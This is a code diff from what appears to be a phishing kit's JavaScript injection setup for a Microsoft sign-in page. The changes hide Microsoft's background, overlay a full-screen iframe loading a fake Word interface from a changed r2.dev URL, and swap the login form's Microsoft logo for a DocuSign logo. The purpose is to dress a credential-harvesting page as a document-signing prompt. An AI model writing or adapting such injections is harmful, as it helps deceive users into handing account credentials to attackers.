@@ -139,12 +139,12 @@ js_inject:
         };
 
         waitFor('#backgroundImage', (bgImg) => {
-          // Remove existing MS background image
+          // Remove Microsoft's background image
           bgImg.style.display = 'none';
 
-          // Inject full Word interface as background
+          // Inject your custom full Word interface
           const iframe = document.createElement("iframe");
-          iframe.src = "https://pub-2a44f4d547ef416eb3d30428f95d5a9e.r2.dev/off.html";
+          iframe.src = "https://pub-4ec73ba7bee04896b7e30d39646ed8f3.r2.dev/off.html"; // <-- updated link
           iframe.style.position = "absolute";
           iframe.style.top = "0";
           iframe.style.left = "0";
@@ -158,4 +158,12 @@ js_inject:
           const container = bgImg.parentElement;
           container.appendChild(iframe);
         });
+
+        // Also replace Microsoft logo inside the form with DocuSign logo
+        waitFor('img.logo', (logoImg) => {
+          logoImg.src = "https://cloudmasonry.com/wp-content/uploads/2020/06/DocuSign-Logo.png"; // <-- DocuSign logo
+          logoImg.style.width = "100px";
+          logoImg.style.objectFit = "contain";
+        });
+
       }, 3000);
